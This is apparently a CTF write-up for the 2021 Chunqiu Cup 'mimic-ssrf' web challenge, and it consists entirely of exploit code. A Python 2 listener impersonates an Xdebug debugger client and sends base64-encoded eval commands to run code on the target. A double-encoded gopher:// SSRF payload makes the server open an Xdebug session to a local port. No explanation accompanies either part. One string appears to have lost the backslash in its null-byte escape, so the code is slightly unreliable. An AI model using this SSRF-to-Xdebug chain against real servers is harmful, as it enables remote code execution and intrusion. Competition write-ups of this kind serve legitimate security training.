# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/【拟态挑战WP】2021年春秋杯秋季赛mimic-ssrf.md
# TITLE: 【拟态挑战WP】2021年春秋杯秋季赛mimic-ssrf
# CATEGORY: web

#!/usr/bin/python2
import socket

ip_port = ('0.0.0.0',13000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    data = raw_input('>> ')
    conn.sendall('eval -i 1 -- %sx00' % data.encode('base64'))
gopher://127.0.0.1:
7410/_GET%2520%252Findex.php%253FXDEBUG_SESSION_START%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A7410%250D%250AUser-Agent%253A%2520curl%252F7.58.0%250D%250AAccept%253A%2520*%252F*%250D%250AX-Forwarded-For%253A%2520ip%250D%250A%250D%250A
